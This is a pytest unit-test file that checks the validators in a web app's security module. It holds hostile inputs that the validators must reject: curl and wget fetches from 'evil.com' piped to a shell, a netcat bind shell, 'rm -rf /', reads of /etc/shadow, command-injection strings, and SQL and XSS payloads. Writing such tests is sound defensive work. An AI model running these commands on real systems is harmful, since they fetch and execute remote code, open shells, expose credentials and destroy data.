"""Unit tests for web/security.py - Critical security validation tests."""

import time
from pathlib import Path
from unittest.mock import Mock

import pytest
from fastapi import HTTPException

from src.ssync.web.security import (
    InputSanitizer,
    PathValidator,
    RateLimiter,
    ScriptValidator,
    sanitize_error_message,
)


class TestPathValidator:
    """Tests for PathValidator class - critical for preventing path traversal attacks."""

    @pytest.mark.unit
    @pytest.mark.security
    def test_validates_safe_absolute_path(self):
        """Test that safe absolute paths are accepted."""
        safe_path = "/tmp/test/job_output.log"
        result = PathValidator.validate_path(safe_path)
        assert isinstance(result, Path)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_path_traversal_double_dot(self):
        """Test that .. in paths is rejected."""
        dangerous_path = "/tmp/../../etc/passwd"
        with pytest.raises(HTTPException) as exc_info:
            PathValidator.validate_path(dangerous_path)
        assert exc_info.value.status_code == 400

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_path_traversal_vectors(self, path_traversal_vector):
        """Test all common path traversal attack vectors."""
        with pytest.raises(HTTPException):
            PathValidator.validate_path(path_traversal_vector)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_ssh_directory_access(self):
        """Test that access to .ssh directories is blocked."""
        ssh_path = "/home/user/.ssh/id_rsa"
        with pytest.raises(HTTPException) as exc_info:
            PathValidator.validate_path(ssh_path)
        assert exc_info.value.status_code == 403

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_sensitive_files(self):
        """Test that access to sensitive files is blocked."""
        sensitive_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/home/user/.gnupg/private.key",
            "/home/user/.aws/credentials",
            "/root/.ssh/id_rsa",
            "/home/user/cert.pem",
            "/home/user/private.key",
        ]

        for path in sensitive_paths:
            with pytest.raises(HTTPException) as exc_info:
                PathValidator.validate_path(path)
            assert exc_info.value.status_code == 403

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_command_injection_attempts(self):
        """Test that command injection attempts in paths are rejected."""
        injection_attempts = [
            "${HOME}/.ssh/id_rsa",
            "$(whoami)/.ssh/id_rsa",
            "`whoami`/.ssh/id_rsa",
            "/tmp/test; rm -rf /",
            "/tmp/test | cat /etc/passwd",
            "/tmp/test && cat /etc/shadow",
        ]

        for path in injection_attempts:
            with pytest.raises(HTTPException):
                PathValidator.validate_path(path)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_empty_path(self):
        """Test that empty paths are rejected."""
        with pytest.raises(HTTPException) as exc_info:
            PathValidator.validate_path("")
        assert exc_info.value.status_code == 400

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_paths_with_null_bytes(self):
        """Test that paths with null bytes are rejected."""
        null_byte_path = "/tmp/test\x00/file.txt"
        with pytest.raises(HTTPException):
            PathValidator.validate_path(null_byte_path)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_paths_with_newlines(self):
        """Test that paths with newlines are rejected."""
        newline_path = "/tmp/test\n/file.txt"
        with pytest.raises(HTTPException):
            PathValidator.validate_path(newline_path)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_windows_backslash_paths(self):
        """Test that backslash paths are rejected."""
        backslash_path = "C:\\Windows\\System32"
        with pytest.raises(HTTPException):
            PathValidator.validate_path(backslash_path)


class TestScriptValidator:
    """Tests for ScriptValidator class - critical for preventing malicious scripts."""

    @pytest.mark.unit
    @pytest.mark.security
    def test_validates_safe_script(self, basic_script):
        """Test that safe scripts are accepted."""
        result = ScriptValidator.validate_script(basic_script)
        assert result == basic_script

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_dangerous_script_patterns(self, dangerous_script_pattern):
        """Test that all dangerous patterns are detected and rejected."""
        pattern, description = dangerous_script_pattern
        script = f"#!/bin/bash\n{pattern}\necho 'done'"

        with pytest.raises(HTTPException) as exc_info:
            ScriptValidator.validate_script(script)
        assert exc_info.value.status_code == 400
        assert "forbidden pattern" in exc_info.value.detail.lower()

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_rm_rf_root(self):
        """Test that rm -rf / is explicitly blocked."""
        dangerous_script = "#!/bin/bash\nrm -rf /\necho 'done'"

        with pytest.raises(HTTPException) as exc_info:
            ScriptValidator.validate_script(dangerous_script)
        assert exc_info.value.status_code == 400

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_remote_code_execution(self):
        """Test that remote code execution attempts are blocked."""
        rce_scripts = [
            "curl http://evil.com/shell.sh | sh",
            "wget http://evil.com/bad | bash",
            "curl -s http://evil.com/cmd | /bin/sh",
        ]

        for script in rce_scripts:
            with pytest.raises(HTTPException):
                ScriptValidator.validate_script(f"#!/bin/bash\n{script}")

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_network_backdoors(self):
        """Test that network backdoor attempts are blocked."""
        backdoor_script = "#!/bin/bash\nnc -l 1234 -e /bin/bash"

        with pytest.raises(HTTPException):
            ScriptValidator.validate_script(backdoor_script)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_eval_with_variable_expansion(self):
        """Test that dangerous eval patterns are blocked."""
        eval_scripts = [
            "eval $(cat /tmp/evil)",
            "eval $REMOTE_COMMAND",
            "eval $(curl http://evil.com)",
        ]

        for script in eval_scripts:
            with pytest.raises(HTTPException):
                ScriptValidator.validate_script(f"#!/bin/bash\n{script}")

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_sudo_commands(self):
        """Test that sudo commands are blocked."""
        sudo_script = "#!/bin/bash\nsudo apt-get install malware"

        with pytest.raises(HTTPException):
            ScriptValidator.validate_script(sudo_script)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_chmod_777(self):
        """Test that overly permissive chmod commands are blocked."""
        chmod_script = "#!/bin/bash\nchmod 777 /important/file"

        with pytest.raises(HTTPException):
            ScriptValidator.validate_script(chmod_script)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_base64_encoded_execution(self):
        """Test that base64 encoded command execution is blocked."""
        encoded_script = "#!/bin/bash\nbase64 -d <<< 'ZXZhbA==' | sh"

        with pytest.raises(HTTPException):
            ScriptValidator.validate_script(encoded_script)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_sensitive_file_access(self):
        """Test that access to sensitive system files is blocked."""
        sensitive_scripts = [
            "cat /etc/passwd",
            "cat /etc/shadow",
            "grep root /etc/shadow",
        ]

        for script in sensitive_scripts:
            with pytest.raises(HTTPException):
                ScriptValidator.validate_script(f"#!/bin/bash\n{script}")

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_writing_to_system_directories(self):
        """Test that writing to system directories is blocked."""
        write_script = "#!/bin/bash\necho 'malware' > /etc/evil.conf"

        with pytest.raises(HTTPException):
            ScriptValidator.validate_script(write_script)

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_script_referencing_sensitive_env_vars(self):
        """Test that scripts referencing sensitive environment variables are blocked."""
        sensitive_env_scripts = [
            "echo $AWS_SECRET_ACCESS_KEY",
            "curl -H \"Authorization: $GITHUB_TOKEN\" http://api.github.com",
            "ssh -i $SSH_PRIVATE_KEY user@host",
        ]

        for script in sensitive_env_scripts:
            with pytest.raises(HTTPException):
                ScriptValidator.validate_script(f"#!/bin/bash\n{script}")

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_empty_script(self):
        """Test that empty scripts are rejected."""
        with pytest.raises(HTTPException) as exc_info:
            ScriptValidator.validate_script("")
        assert exc_info.value.status_code == 400

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_oversized_script(self):
        """Test that scripts exceeding size limit are rejected."""
        # Create a script larger than MAX_SCRIPT_SIZE
        large_script = "#!/bin/bash\n" + ("echo 'padding'\n" * 100000)

        with pytest.raises(HTTPException) as exc_info:
            ScriptValidator.validate_script(large_script)
        assert exc_info.value.status_code == 400
        assert "too large" in exc_info.value.detail.lower()

    @pytest.mark.unit
    @pytest.mark.security
    def test_rejects_script_with_very_long_line(self):
        """Test that scripts with excessively long lines are rejected."""
        long_line = "echo '" + ("A" * 15000) + "'"
        script = f"#!/bin/bash\n{long_line}"

        with pytest.raises(HTTPException) as exc_info:
            ScriptValidator.validate_script(script)
        assert exc_info.value.status_code == 400

    @pytest.mark.unit
    @pytest.mark.security
    def test_accepts_safe_script_with_common_commands(self):
        """Test that safe scripts with common commands are accepted."""
        safe_script = """#!/bin/bash
#SBATCH --job-name=training
#SBATCH --time=01:00:00

echo "Starting training..."
python train.py --epochs 100
echo "Training complete"
"""
        result = ScriptValidator.validate_script(safe_script)
        assert result == safe_script


class TestInputSanitizer:
    """Tests for InputSanitizer class - input validation and sanitization."""

    @pytest.mark.unit
    def test_sanitize_valid_hostname(self):
        """Test that valid hostnames are accepted and normalized."""
        hostname = "CLUSTER.Example.COM"
        result = InputSanitizer.sanitize_hostname(hostname)
        assert result == "cluster.example.com"

    @pytest.mark.unit
    def test_sanitize_hostname_rejects_invalid(self):
        """Test that invalid hostnames are rejected."""
        invalid_hostnames = [
            "",
            "host name with spaces",
            "host;name",
            "host$(whoami)",
            "host`whoami`",
            "../../../etc/passwd",
            "host&name",
        ]

        for hostname in invalid_hostnames:
            with pytest.raises(HTTPException):
                InputSanitizer.sanitize_hostname(hostname)

    @pytest.mark.unit
    def test_sanitize_valid_job_id(self):
        """Test that valid job IDs are accepted."""
        valid_job_ids = [
            "12345",
            "12345_0",
            "12345_67",
            "12345_[0-99]",
            "12345_[1,3,5]",
        ]

        for job_id in valid_job_ids:
            result = InputSanitizer.sanitize_job_id(job_id)
            assert result == job_id

    @pytest.mark.unit
    @pytest.mark.security
    def test_sanitize_job_id_rejects_injection_attempts(self, invalid_job_id):
        """Test that SQL/command injection attempts in job IDs are rejected."""
        with pytest.raises(HTTPException):
            InputSanitizer.sanitize_job_id(invalid_job_id)

    @pytest.mark.unit
    @pytest.mark.security
    def test_sanitize_job_id_rejects_path_traversal(self):
        """Test that path traversal in job IDs is rejected."""
        invalid_ids = [
            "../123",
            "../../123",
            "123/../../etc/passwd",
        ]

        for job_id in invalid_ids:
            with pytest.raises(HTTPException):
                InputSanitizer.sanitize_job_id(job_id)

    @pytest.mark.unit
    def test_sanitize_valid_username(self):
        """Test that valid usernames are accepted."""
        username = "testuser"
        result = InputSanitizer.sanitize_username(username)
        assert result == "testuser"

    @pytest.mark.unit
    def test_sanitize_username_rejects_invalid(self):
        """Test that invalid usernames are rejected."""
        invalid_usernames = [
            "UPPERCASE",  # Unix usernames are lowercase
            "user name",  # No spaces
            "user;drop table",  # No special chars
            "../etc",
        ]

        for username in invalid_usernames:
            with pytest.raises(HTTPException):
                InputSanitizer.sanitize_username(username)

    @pytest.mark.unit
    def test_sanitize_username_accepts_empty(self):
        """Test that empty username is accepted (optional field)."""
        result = InputSanitizer.sanitize_username("")
        assert result == ""

    @pytest.mark.unit
    def test_sanitize_filename_removes_path_components(self):
        """Test that path components are removed from filenames."""
        filename = "/path/to/../../file.txt"
        result = InputSanitizer.sanitize_filename(filename)
        assert "/" not in result
        assert ".." not in result

    @pytest.mark.unit
    def test_sanitize_filename_removes_dangerous_chars(self):
        """Test that dangerous characters are removed from filenames."""
        filename = "file; rm -rf /.txt"
        result = InputSanitizer.sanitize_filename(filename)
        assert ";" not in result

    @pytest.mark.unit
    def test_sanitize_filename_truncates_long_names(self):
        """Test that very long filenames are truncated."""
        long_filename = "a" * 300 + ".txt"
        result = InputSanitizer.sanitize_filename(long_filename)
        assert len(result) <= 255

    @pytest.mark.unit
    def test_sanitize_text_removes_control_characters(self):
        """Test that control characters are removed from text."""
        text = "Hello\x00\x01\x02World\x1F"
        result = InputSanitizer.sanitize_text(text)
        assert "\x00" not in result
        assert "\x01" not in result
        assert "HelloWorld" in result

    @pytest.mark.unit
    def test_sanitize_text_removes_sql_injection(self):
        """Test that SQL injection patterns are removed."""
        injection_texts = [
            "test'; DROP TABLE users; --",
            "test UNION SELECT * FROM passwords",
            "test /* comment */ DELETE",
        ]

        for text in injection_texts:
            result = InputSanitizer.sanitize_text(text)
            assert "DROP" not in result
            assert "DELETE" not in result

    @pytest.mark.unit
    def test_sanitize_text_removes_xss(self):
        """Test that XSS patterns are removed."""
        xss_text = '<script>alert("xss")</script>'
        result = InputSanitizer.sanitize_text(xss_text)
        assert "<script" not in result
        assert "alert" not in result

    @pytest.mark.unit
    def test_sanitize_text_truncates_long_text(self):
        """Test that long text is truncated."""
        long_text = "a" * 2000
        result = InputSanitizer.sanitize_text(long_text, max_length=1000)
        assert len(result) <= 1000


class TestRateLimiter:
    """Tests for RateLimiter class - prevent abuse."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_allows_normal_request_rate(self):
        """Test that normal request rates are allowed."""
        limiter = RateLimiter(requests_per_minute=10, burst_size=5)
        mock_request = Mock()
        mock_request.headers = {}
        mock_request.client = Mock(host="127.0.0.1")

        # Send a few requests - should all be allowed
        for _ in range(5):
            result = await limiter.check_rate_limit(mock_request)
            assert result is True

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_blocks_excessive_requests(self):
        """Test that excessive requests are blocked."""
        limiter = RateLimiter(requests_per_minute=5, burst_size=2)
        mock_request = Mock()
        mock_request.headers = {}
        mock_request.client = Mock(host="127.0.0.1")

        # Send many requests rapidly
        results = []
        for _ in range(20):
            result = await limiter.check_rate_limit(mock_request)
            results.append(result)

        # Should have some rejections
        assert False in results

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_rate_limits_per_ip(self):
        """Test that rate limiting is per IP address."""
        limiter = RateLimiter(requests_per_minute=5, burst_size=2)

        mock_request1 = Mock()
        mock_request1.headers = {}
        mock_request1.client = Mock(host="127.0.0.1")

        mock_request2 = Mock()
        mock_request2.headers = {}
        mock_request2.client = Mock(host="192.168.1.1")

        # Fill up rate limit for first IP
        for _ in range(10):
            await limiter.check_rate_limit(mock_request1)

        # Second IP should still be allowed
        result = await limiter.check_rate_limit(mock_request2)
        assert result is True

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_rate_limits_by_api_key(self):
        """Test that rate limiting uses API key if present."""
        limiter = RateLimiter(requests_per_minute=5, burst_size=2)

        mock_request = Mock()
        mock_request.headers = {"x-api-key": "test-key-123"}
        mock_request.client = Mock(host="127.0.0.1")

        # Should identify by API key, not IP
        for _ in range(10):
            await limiter.check_rate_limit(mock_request)

        # Different IP, same API key - should be rate limited
        mock_request2 = Mock()
        mock_request2.headers = {"x-api-key": "test-key-123"}
        mock_request2.client = Mock(host="192.168.1.1")

        # May be blocked due to shared API key
        await limiter.check_rate_limit(mock_request2)

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_handles_x_forwarded_for_header(self):
        """Test that X-Forwarded-For header is respected."""
        limiter = RateLimiter(requests_per_minute=5, burst_size=2)

        mock_request = Mock()
        mock_request.headers = {"x-forwarded-for": "203.0.113.1, 198.51.100.1"}
        mock_request.client = Mock(host="127.0.0.1")

        result = await limiter.check_rate_limit(mock_request)
        assert result is True


class TestSanitizeErrorMessage:
    """Tests for sanitize_error_message function - prevent information disclosure."""

    @pytest.mark.unit
    @pytest.mark.security
    def test_removes_file_paths(self):
        """Test that file paths are removed from error messages."""
        error = Exception("Error in /home/user/project/file.py")
        result = sanitize_error_message(error)
        assert "/home/user" not in result
        assert "[PATH]" in result or "[USER]" in result

    @pytest.mark.unit
    @pytest.mark.security
    def test_removes_ip_addresses(self):
        """Test that IP addresses are removed from error messages."""
        error = Exception("Connection failed to 192.168.1.100")
        result = sanitize_error_message(error)
        assert "192.168.1.100" not in result
        assert "[IP]" in result

    @pytest.mark.unit
    @pytest.mark.security
    def test_removes_port_numbers(self):
        """Test that port numbers are removed from error messages."""
        error = Exception("Failed to connect to server:8080")
        result = sanitize_error_message(error)
        assert ":8080" not in result
        assert "[PORT]" in result

    @pytest.mark.unit
    @pytest.mark.security
    def test_removes_usernames_from_paths(self):
        """Test that usernames in paths are removed."""
        error = Exception("Error in /home/john/project")
        result = sanitize_error_message(error)
        assert "john" not in result
        assert "[USER]" in result

    @pytest.mark.unit
    @pytest.mark.security
    def test_handles_multiple_sensitive_items(self):
        """Test that multiple sensitive items are all sanitized."""
        error = Exception(
            "Connection to 192.168.1.1:8080 failed while accessing /home/user/file.py"
        )
        result = sanitize_error_message(error)
        assert "192.168.1.1" not in result
        assert "8080" not in result
        assert "/home/user" not in result
